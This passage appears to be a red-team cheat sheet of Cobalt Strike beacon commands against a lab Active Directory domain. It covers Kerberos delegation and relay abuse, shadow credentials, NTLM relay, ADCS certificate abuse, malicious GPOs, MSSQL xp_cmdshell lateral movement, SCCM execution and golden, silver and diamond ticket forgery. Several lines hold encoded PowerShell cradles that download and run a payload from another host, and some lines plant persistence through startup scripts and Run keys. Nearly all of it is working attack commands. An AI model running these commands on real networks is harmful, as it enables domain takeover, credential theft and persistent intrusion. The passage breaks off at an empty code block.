beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
# Create computer
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
# Hash
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
# TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
```

```bash
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
# Get SID of computer
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
# Powershell concatenated
beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
# Perform s4u
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
beacon> steal_token 4092
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

### Shadow Credentials

```bash
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"y52EhYqlfgnYPuRb" /nowrap
# Remove
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc-2$ /deviceid:58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
```

### Kerberos Relay Attacks

#### RBCD


* -spn is the target service to relay to.
* -clsid represents RPC_C_IMP_LEVEL_IMPERSONATE.
* -rbcd is the SID of the fake computer account.
* -port is the port returned by CheckPort.


```bash
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
beacon> powershell Get-DomainComputer -Identity EvilComputer -Properties objectsid
beacon> execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-9101 -port 10
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:host/wkstn-2 /ticket:doIF8j[...snip...]MuaW8= /ptt
beacon> elevate svc-exe-krb tcp-local
```

#### Shadow Credentials

> If you perform these attacks back-to-back and see an error like (0x800706D3): The authentication service is unknown. then reboot the machine or wait for the next clock sync.

```bash
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn-2$
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA[...snip...]QCAgfQ /password:"06ce8e51-a71a-4e0c-b8a3-992851ede95f" /enctype:aes256 /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:doIGkD[...snip...]5pbw== /ptt
beacon> elevate svc-exe-krb tcp-local
```

## Pivoting

### Socks

> Since this is bound on all interfaces, any device that has network access to the team server VM may, in theory, interact with the SOCKS traffic.  Even though this should not be the case, the use of SOCKS5 gives an additional layer of protection.

```bash
beacon> socks 1080
# Socks5
beacon> socks 1080 socks5 disableNoAuth myUser myPassword enableLogging
```

### Proxychains

```bash
attacker@ubuntu ~> sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 myUser myPassword
proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
proxychains wmiexec.py DEV/jking@10.10.122.30
```

### Kerberos

```bash
proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
export KRB5CCNAME=jking.ccache
proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
```

```bash
# ticket.kirbi
echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi
ticketConverter.py bfarmer.kirbi bfarmer.ccache
proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io
```

### Web

Configure foxyproxy

- https://offensivedefence.co.uk/posts/ntlm-auth-firefox/

### Reverse Port Forward

```bash
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
beacon> rportfwd 8080 127.0.0.1 80
beacon> run netstat -anp tcp
# Remove Firewall Rule
beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"
```

### NTLM Relay


1. A driver to redirect traffic destined for port 445 to another port (e.g. 8445) that we can bind to.
2. A reverse port forward on the port the SMB traffic is being redirected to.  This will tunnel the SMB traffic over the C2 channel to our Team Server.
3. The tool of choice (ntlmrelayx) will be listening for SMB traffic on the Team Server.
4. A SOCKS proxy is to allow ntlmrelayx to send traffic back into the target network.

> This pretty much breaks any legitimate SMB service on the machine.

> One of the main indicators of this activity is the driver load event for WinDivert.  You can find driver loads in Kibana using the "Loaded Drivers" saved search.

```bash
# allow those ports inbound on the Windows firewall
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
# Then start two reverse port forwards
beacon> rportfwd 8445 localhost 445
beacon> rportfwd 8080 localhost 80
# setup is to start a SOCKS proxy that ntlmrelayx can use to send relay responses back into the network
beacon> socks 1080
sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
# Then go to Cobalt Strike > Script Manager and load PortBender.cna from C:\Tools\PortBender - this adds a new PortBender command to the console
beacon> PortBender redirect 445 8445
beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
```

### Relaying WebDAV

```bash
beacon> inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2
sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --delegate-access -smb2support --http-port 8888
beacon> powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888
beacon> rportfwd 8888 localhost 8888
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwned
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:dev.cyberbotic.io /user:PVWUMPYT$ /password:'4!t1}}I_CGJ}0OJ'
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:PVWUMPYT$ /impersonateuser:nlamb /msdsspn:cifs/wkstn-1.dev.cyberbotic.io /aes256:46B94228F43282498F562FEF99C5C4AF67269BE5C8AD31B193135C7BD38A28A2 /nowrap
sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shadow-credentials -smb2support --http-port 8888
```

## ADCS

```bash
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password: pass123
Verifying - Enter Export Password: pass123
cat cert.pfx | base64 -w 0
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
```

### NTLM Relaying to ADCS HTTP Endpoints

```bash
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
```

### User & Computer Persistence

#### User

```bash
# Request ticket of user if you dont have one
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
beacon> mimikatz crypto::certificates /export
beacon> download CURRENT_USER_My_0_Nina Lamb.pfx
ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /nowrap
```

#### Computer

```bash
# Request ticket
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
# Computer ticket
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap
```

## Group Policy

```bash
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
beacon> powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
beacon> powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
beacon> powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
beacon> powershell Find-DomainShare -CheckShareAccess
```

```bash
beacon> powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
beacon> powershell New-GPO -Name "Evil GPO"
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
beacon> powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
```

## MSSQL

### SQL Servers

```bash
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon> powershell Get-SQLInstanceDomain
beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
# Multiple servers
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
# List spns
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info
# Info using user
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
# Search 
beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
# authe as user mssql
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
```

#### Query info

- https://www.heidisql.com/

```bash
#powershell
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"
# SQLRECON
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"
# mssqlclient.py 
ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
```

### Impersonation

Allows the executing user to assume the permissions of another user without needing to know their password

```sql
/* permissions */
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
/* ID */
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
```

```bash
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc
```

#### Check permissions

```sql

SELECT SYSTEM_USER;
DEV\bfarmer

SELECT IS_SRVROLEMEMBER('sysadmin');
0
/* execute as */
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
DEV\mssql_svc

EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
1
```

#### Command Execution

> The xp_cmdshell procedure can be used to execute shell commands on the SQL server if you have sysadmin privileges

```bash
beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```

The reason this works with Invoke-SQLOSCmd is because it will automatically attempt to enable xp_cmdshell if it's not already, execute the given command, and then disable it again

```sql
/* check if is enabled */
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
/* enable it and recheck it */
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

```bash
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
```

```bash
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
beacon> rportfwd 8080 127.0.0.1 80
beacon> portscan 10.10.122.25 445
powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
# or
powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=
beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
```

### Lateral Movement

#### Check

```bash
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
```

```bash
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links
```

#### Query

> The use of double and single quotes is important when using OpenQuery.

```sql
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

```bash
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
```

```sql
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
```

#### Aditional Links

> This output shows that the link from SQL-2 to SQL-1 is configured with a local sa account, and that it has sysadmin privileges on the remote server.  Your level of privilege on the linked server will depend on how the link is configured.  It's worth noting that in this particular case, any user who has public read access to the SQL-2 database instance will inherit sysadmin rights on SQL-1.  We do not need to be sysadmin on SQL-2 first.

```bash
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
beacon> powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io
```

```bash
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
beacon> rportfwd 8080 127.0.0.1 80
```

```sql
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''')
EXEC('xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''') AT [sql-1.cyberbotic.io]
```

```bash
beacon> link sql-1.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
```

#### Privilege Escalation

```bash
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGMAJwApAA=="
beacon> connect localhost 4444
```

## Microsoft Configuration Manager

### Enumeration

```bash
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner
beacon> powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
```

### Lateral Movement

```bash
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
```

### Network Credentials

```bash
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
beacon> make_token cyberbotic.io\sccm_svc Cyberb0tic
beacon> ls \\dc-1.cyberbotic.io\c$
```

## Domain Dominance

### Silver Ticket

> You need a (RC4/AES keys) of a computer account

Here are some useful ticket combinations:
|Technique	Required |Service Tickets|
|-----------|----------|
|psexec	|HOST & CIFS|
|winrm|	HOST & HTTP|
|dcsync (DCs only)	|LDAP|

```bash
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
beacon> steal_token 5668
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
```

### Golden Ticket

> You need krbtgt hash

```bash
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
# ticket
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
beacon> steal_token 5060
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

### Diamond Ticket

A "diamond ticket" is made by modifying the fields of a legitimate TGT that was issued by a DC

* `/tgtdeleg` uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.
* `/ticketuser` is the username of the user to impersonate.
* `/ticketuserid` is the domain RID of that user.
* `/groups` are the desired group RIDs (512 being Domain Admins).
* `/krbkey` is the krbtgt AES256 hash.

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=
```

### Forget Certificates

Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate

> Also you can forge certificates for machines. Combine this with the S4U2self trick to gain access to any machine or service in the domain.

```bash
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap
```

## Forest & Domain Trusts

### Parent/Child

> f we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using a TGT with a special attribute called SID History.

#### Golden Ticket

```bash
beacon> powershell Get-DomainTrust
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap
beacon> run klist
beacon> ls \\dc-1.cyberbotic.io\c$
```

#### Diamond Ticket

> If dev.cyberbotic.io also had a child (e.g. test.dev.cyberbotic.io), then a DA in TEST would be able to use their krbtgt to hop to DA/EA in cyberbotic.io instantly because the trusts are transitive.

```bash
